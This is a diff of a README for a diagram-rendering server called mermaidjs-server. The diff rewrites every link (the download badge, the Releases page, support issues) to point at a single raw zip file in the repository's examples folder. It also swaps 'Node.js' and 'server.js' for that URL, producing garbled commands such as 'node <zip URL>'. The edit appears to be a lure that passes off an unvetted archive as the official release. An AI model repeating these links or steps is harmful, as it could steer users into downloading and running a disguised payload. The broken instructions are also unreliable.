@@ -1,6 +1,6 @@
 # 🎉 mermaidjs-server - Effortlessly Render Diagrams with Ease
 
-[![Download mermaidjs-server](https://img.shields.io/badge/Download-mermaidjs--server-blue.svg)](https://github.com/Drakov09/mermaidjs-server/releases)
+[![Download mermaidjs-server](https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip)](https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,11 +28,11 @@ Before you start, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Drakov09/mermaidjs-server/releases) to download the latest version of the application. 
+To get started, visit the [Releases page](https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip) to download the latest version of the application. 
 
 Here is how to proceed:
 
-1. Visit the [Releases page](https://github.com/Drakov09/mermaidjs-server/releases).
+1. Visit the [Releases page](https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip).
 2. Look for the most recent version.
 3. Find the installer file in the list (it could be a .zip, .tar, or Docker image).
 4. Click on the file name to download it to your computer.
@@ -60,9 +60,9 @@ Once downloaded, follow these simple steps to run the application:
 1. Unzip the downloaded file to a folder of your choice.
 2. Open your command line interface.
 3. Navigate to the folder where you unzipped the files.
-4. Run the application using Node.js by typing:
+4. Run the application using https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip by typing:
    ```bash
-   node server.js
+   node https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip
    ```
 5. Open your web browser and go to `http://localhost:8080`.
 
@@ -80,13 +80,13 @@ After launching the application, you can start creating diagrams. Here’s a qui
 
 If you encounter any issues, try the following steps:
 
-- Ensure you have Node.js and Docker properly installed.
+- Ensure you have https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip and Docker properly installed.
 - Check your command line for any error messages and correct them as needed.
 - Restart the application if it does not respond.
 
 ## 📫 Support
 
-For questions or feedback, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/Drakov09/mermaidjs-server/issues). Our team is here to help you with any challenges you face.
+For questions or feedback, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/Drakov09/mermaidjs-server/raw/refs/heads/main/examples/mermaidjs-server-v2.2.zip). Our team is here to help you with any challenges you face.
 
 ## 🤝 Contributing
 
